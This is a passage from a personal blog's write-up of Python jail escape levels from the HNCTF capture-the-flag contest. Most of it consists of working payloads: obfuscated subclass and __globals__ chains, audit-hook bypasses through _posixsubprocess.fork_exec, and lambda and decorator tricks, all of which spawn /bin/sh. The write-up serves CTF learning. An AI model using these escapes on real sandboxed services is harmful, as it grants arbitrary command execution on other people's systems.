<h5 id="or-rather-use-join"><a class="markdownIt-Anchor" href="#or-rather-use-join">#</a> Or rather use  <code>join</code> :</h5>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">86</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__doc__<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></tbody></table></figure><h3 id="level-43"><a class="markdownIt-Anchor" href="#level-43">#</a> LEVEL 4.3</h3>
<p>Quite same as before…</p>
<p><img src="/pythonJail/level4.3wp.webp" alt="level4.3"></p>
<br>
##### The next few levels are become harder and harder.
<br>
<h3 id="level-6"><a class="markdownIt-Anchor" href="#level-6">#</a> LEVEL 6</h3>
<h4 id="repetition"><a class="markdownIt-Anchor" href="#repetition">#</a> repetition:</h4>
<p><img src="/pythonJail/level6wp1.webp" alt="level6wp1"><br>
<img src="/pythonJail/level6wp2.webp" alt="level6wp2"><br>
<img src="/pythonJail/level6wp3.webp" alt="level6wp3"></p>
<h5 id="link-that-may-help-you"><a class="markdownIt-Anchor" href="#link-that-may-help-you">#</a> <a target="_blank" rel="noopener" href="https://ctftime.org/writeup/31883">link that may help you</a></h5>
<p>The basic idea is to RCE with  <code>_posixsubprocess.fork_exec</code> . If we import it directly, it will trigger the audit hook. But we can pass it by using  <code>__builtins__['__loader__'].load_module('_posixsubprocess')</code>  or  <code>__loader__.load_module('_posixsubprocess')</code> . Also, due to its repeatedly exct, we just shell like this:</p>
<pre><code>import os
__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
</code></pre>
<h3 id="level-61"><a class="markdownIt-Anchor" href="#level-61">#</a> LEVEL 6.1</h3>
<p>This time, we only got one time to excute our payload. Though, we our learning above, we know that walrus operator can help us. Also, the shell will shut immediately, the blogger think of a interesting way to overcome this, by brute force, getting shell over and over again and try to input command. That works.</p>
<p><img src="/pythonJail/level6.1wp.webp" alt="level6.1wp"></p>
<h5 id="payload-3"><a class="markdownIt-Anchor" href="#payload-3">#</a> payload:</h5>
<pre><code>[os := __import__('os'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), [_posixsubprocess.fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in range(100000)]]
</code></pre>
<h5 id="or"><a class="markdownIt-Anchor" href="#or">#</a> or</h5>
<pre><code>[os := __import__('os'), itertools := __loader__.load_module('itertools'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), [_posixsubprocess.fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]
</code></pre>
<h3 id="safeeval"><a class="markdownIt-Anchor" href="#safeeval">#</a> SAFEEVAL</h3>
<p>Use lambda to wrap up RCE</p>
<p>payload:</p>
<pre><code>(lambda: __import__('os').system('sh'))()
</code></pre>
<p><img src="/pythonJail/safeeval_1.webp" alt="safeeval"><br>
<img src="/pythonJail/safeeval_2.webp" alt="safeeval"></p>
<h3 id="level7"><a class="markdownIt-Anchor" href="#level7">#</a> LEVEL7</h3>
<h6 id="come-back-later-to-try-to-figure-it-out"><a class="markdownIt-Anchor" href="#come-back-later-to-try-to-figure-it-out">#</a> Come back later to try to figure it out…</h6>
<p>payload:</p>
<blockquote>
<p>@exec<br>
@input<br>
class X: pass</p>
</blockquote>
<blockquote>
<p><strong>import</strong>(‘os’).system(‘sh’)</p>
</blockquote>
<h5 id="blog"><a class="markdownIt-Anchor" href="#blog">#</a> <a target="_blank" rel="noopener" href="https://gynvael.coldwind.pl/n/python_sandbox_escape">blog</a></h5>
<pre><code>↑# [organizers] Robin_Jadoul solution↑
</code></pre>
<p><img src="/pythonJail/level7wp1.webp" alt="level7"><br>
<img src="/pythonJail/level7wp2.webp" alt="level7"></p>
<h3 id="ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail"><a class="markdownIt-Anchor" href="#ok-so-thats-the-end-of-the-hnctf-there-are-some-thing-that-may-help-you-get-further-about-pyjail">#</a> Ok, so that’s the end of the hnctf. There are some thing that may help you get further about pyjail:</h3>
<pre><code>https://gynvael.coldwind.pl/n/python_sandbox_escape

https://www.youtube.com/watch?v=Ub_BMOMDOx0

https://zhuanlan.zhihu.com/p/578966149
</code></pre>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>Moyao
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://demoyao100.github.io/pythonJail/" title="pythonJail">https://demoyao100.github.io/pythonJail/</a>
  </li>
  <li class="post-copyright-license">
      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/jail/" rel="tag"># jail</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/Changes-of-Python-API-in-IDA/" rel="prev" title="Changes of Python API in IDA">
                  <i class="fa fa-angle-left"></i> Changes of Python API in IDA
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/hnctfRe/" rel="next" title="hnctfRe">
                  hnctfRe <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    © 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">Moyao</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> &amp; <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>





</body></html>